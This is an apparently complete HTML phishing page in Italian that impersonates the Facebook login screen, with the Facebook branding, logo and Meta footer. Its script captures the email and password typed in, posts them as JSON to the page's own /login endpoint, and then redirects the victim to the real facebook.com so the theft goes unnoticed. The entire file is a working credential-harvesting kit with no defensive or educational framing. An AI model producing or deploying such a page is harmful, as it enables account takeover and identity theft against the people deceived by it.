<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook - Accedi o registrati</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/svg+xml" />
  <link rel="stylesheet" href="facebook.css" />
</head>
<body>
  <div class="fb-container">
    <img src="facebook.png" alt="Facebook logo" class="fb-logo" />

    <form id="loginForm" class="fb-form" method="POST" action="/login" autocomplete="on">
      <input type="text" name="email" placeholder="Email o numero di telefono" autocomplete="username" required />
      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
      <button type="submit">Accedi</button>
      <a href="#" class="forgot">Hai dimenticato la password?</a>
      <hr />
      <a href="#" class="create-account">Crea nuovo account</a>
    </form>

    <footer class="meta-footer">
      <img src="meta.png" alt="Meta logo" class="meta-logo" />
      <div class="meta-links">
        <a href="#">Informazioni</a> · 
        <a href="#">Centro assistenza</a> · 
        <a href="#">Altro</a>
      </div>
    </footer>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      const email = document.querySelector("input[name='email']").value;
      const password = document.querySelector("input[name='password']").value;

      try {
        const response = await fetch("/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password })
        });

        if (response.ok) {
          alert("Accesso inviato correttamente!");
          window.location.href = "https://facebook.com";
        } else {
          alert("Errore nell'invio.");
        }
      } catch (error) {
        console.error("Errore:", error);
        alert("Errore di connessione.");
      }
    });
  </script>
</body>
</html>
